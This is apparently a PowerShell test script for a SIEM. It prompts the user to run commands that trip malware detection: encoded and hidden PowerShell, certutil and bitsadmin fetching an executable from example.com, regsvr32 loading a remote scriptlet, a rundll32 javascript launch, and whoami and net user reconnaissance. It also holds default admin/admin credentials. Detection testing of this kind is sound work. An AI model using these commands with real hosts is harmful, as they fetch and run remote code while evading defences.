# üß™ Test Malware Detection
# Test real-time malware pattern detection

Write-Host "üß™ Testing Malware Detection" -ForegroundColor Cyan
Write-Host "============================" -ForegroundColor Cyan
Write-Host ""

Write-Host "üîç This test will trigger malware detection patterns" -ForegroundColor Yellow
Write-Host "‚ö†Ô∏è  WARNING: These are SAFE test commands that trigger detection" -ForegroundColor Red
Write-Host ""

# Test 1: PowerShell Malware Detection
Write-Host "üéØ Test 1: PowerShell Malware Detection" -ForegroundColor Green
Write-Host "   This will trigger encoded PowerShell detection" -ForegroundColor White
Write-Host ""

Write-Host "üí° To test PowerShell malware detection:" -ForegroundColor Cyan
Write-Host "   1. Open PowerShell" -ForegroundColor White
Write-Host "   2. Run: powershell.exe -enc SGVsbG8gV29ybGQ=" -ForegroundColor White
Write-Host "   3. Run: powershell.exe -windowstyle hidden -enc SGVsbG8gV29ybGQ=" -ForegroundColor White
Write-Host ""

Write-Host "‚è≥ Waiting for PowerShell tests..." -ForegroundColor Yellow
Write-Host "   (Press any key when you've completed the PowerShell tests)" -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

# Test 2: Command Injection Detection
Write-Host ""
Write-Host "üéØ Test 2: Command Injection Detection" -ForegroundColor Green
Write-Host "   This will trigger command injection patterns" -ForegroundColor White
Write-Host ""

Write-Host "üí° To test command injection detection:" -ForegroundColor Cyan
Write-Host "   1. Open Command Prompt" -ForegroundColor White
Write-Host "   2. Run: cmd.exe /c whoami" -ForegroundColor White
Write-Host "   3. Run: cmd.exe /c net user" -ForegroundColor White
Write-Host ""

Write-Host "‚è≥ Waiting for command injection tests..." -ForegroundColor Yellow
Write-Host "   (Press any key when you've completed the command tests)" -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

# Test 3: File Download Detection
Write-Host ""
Write-Host "üéØ Test 3: File Download Detection" -ForegroundColor Green
Write-Host "   This will trigger file download patterns" -ForegroundColor White
Write-Host ""

Write-Host "üí° To test file download detection:" -ForegroundColor Cyan
Write-Host "   1. Open Command Prompt as Administrator" -ForegroundColor White
Write-Host "   2. Run: certutil.exe -urlcache -split -f http://example.com/test.exe" -ForegroundColor White
Write-Host "   3. Run: bitsadmin.exe /transfer test http://example.com/test.exe C:\temp\test.exe" -ForegroundColor White
Write-Host ""

Write-Host "‚è≥ Waiting for file download tests..." -ForegroundColor Yellow
Write-Host "   (Press any key when you've completed the download tests)" -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

# Test 4: DLL Hijacking Detection
Write-Host ""
Write-Host "üéØ Test 4: DLL Hijacking Detection" -ForegroundColor Green
Write-Host "   This will trigger DLL hijacking patterns" -ForegroundColor White
Write-Host ""

Write-Host "üí° To test DLL hijacking detection:" -ForegroundColor Cyan
Write-Host "   1. Open Command Prompt as Administrator" -ForegroundColor White
Write-Host "   2. Run: regsvr32.exe /s /n /u /i:http://example.com/payload.sct scrobj.dll" -ForegroundColor White
Write-Host "   3. Run: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();" -ForegroundColor White
Write-Host ""

Write-Host "‚è≥ Waiting for DLL hijacking tests..." -ForegroundColor Yellow
Write-Host "   (Press any key when you've completed the DLL tests)" -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

Write-Host ""
Write-Host "‚úÖ Malware Detection Test Completed!" -ForegroundColor Green
Write-Host "   Check your SIEM dashboard for detected malware patterns" -ForegroundColor Yellow
Write-Host "   Dashboard: http://localhost:3000 (admin/admin)" -ForegroundColor Cyan

$headers = @{
    "X-ClickHouse-User" = "admin"
    "X-ClickHouse-Key" = "admin"
}

# Example query usage:
$response = Invoke-RestMethod -Uri "http://localhost:8123" -Method POST -Headers $headers -Body $query

# Use fields: event_time, source_ip, threat_type, severity, message, confidence_score, geo_country 